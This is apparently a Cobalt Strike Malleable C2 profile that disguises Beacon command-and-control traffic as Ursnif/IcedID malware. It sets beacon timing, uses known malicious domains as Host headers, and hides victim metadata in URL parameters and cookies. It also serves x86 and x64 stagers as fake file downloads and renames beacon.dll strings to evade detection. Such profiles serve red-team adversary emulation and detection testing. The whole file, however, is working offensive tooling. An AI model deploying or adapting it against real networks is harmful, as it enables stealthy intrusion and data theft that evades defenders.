#ursnif_IcedID malware profile
#https://www.malware-traffic-analysis.net/2018/11/08/index.html
#xx0hcd


set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
set dns_idle "8.8.8.8";
set maxdns    "235";
set sample_name "urnif_IcedID profile";


#https-certificate {
#  set keystore "demo.store";
#  set password "whateverpass";
#}


#prob have to change Host header to something legit depending on testing.
http-get {

    set uri "/images/U2gVFoeT1Sh8s/";
    
    client {

	header "Host" "jititliste.com";
	header "Accept" "text/html, application/xhtml+xml, */*";
	header "Accept-Language" "en-US";
	header "DNT" "1";
	header "Connection" "Keep-Alive";
	
        
        metadata {
            netbios;
	    parameter "id";

        }

    }

    server {

	header "Server" "Apache/2.2.22 (Debian)";
	header "X-Powered-By" "PHP/5.4.45-0+deb7u14";
	header "Pragma" "no-cache";
	header "Set-Cookie" "lang=en; expires=Sat, 08-Dec-2018 15:50:58 GMT; path=/; domain=.jititliste.com; id=";
	header "Vary" "Accept-Encoding";
	header "Keep-Alive" "timeout=5, max=100";	
	header "Connection" "Keep-Alive";	
	header "Content-Type" "text/html";
	
	
	
	
        
#using newline ("\n") shows as a period (".") in c2lint, but looks correct in wireshark.
        output {

            netbios;
	    prepend "1faa\n";
            print;
	    
        }
    }
}

http-post {

    set verb "GET";    
    set uri "/data2.php";

    client {

	header "Host" "themiole.biz";
	header "Upgrade" "websocket";
	header "Connection" "Upgrade";  
        
        output {
            netbios;	    
	    prepend "PHPSESSID=";      
	    header "Cookie";


        }


        id {
	    netbios;
	    parameter "";
	

        }
    }

    server {

	header "Server" "openresty";
	header "Connection" "upgrade";
	header "Sec-Websocket-Accept" "Kfh9QIsMVZc16xEPYxPHzW8SZ8w-";
	header "Upgrade" "websocket";
	
        

        output {
            netbios;
	    prepend ".";
	    prepend "..NPyo=....\n";	    
	    append ".......... .......... ..........";
 	    print;
        }
    }
}

http-stager {

    set uri_x86 "/WES/Fatog.php";
    set uri_x64 "/WES/fatog.php";

    client {
	header "Host" "mnesenesse.com";
	header "Connection" "Keep-Alive";
    }

    server {
	header "Server" "Apache/2.2.15 (CentOS)";
	header "X-Powered-By" "PHP/7.2.11";
	header "Content-Discription" "File Transfer";
	header "Content-Disposition" "attachment; filename=\"ledo2.xap\"";
	header "Content-Type" "application/octet-stream";
	header "Cache-Control" "must-revalidate";
	header "Connection" "close";
    
    }


}


stage {
	set checksum       "0";
	set compile_time   "12 Jun 2018 11:22:23";
	set image_size_x86 "543900";
	set image_size_x64 "543900";
	transform-x86 {
		strrep "beacon.dll" "";
	}
	transform-x64 {
		strrep "beacon.x64.dll" "aoushdquwe.exe";
	}

}


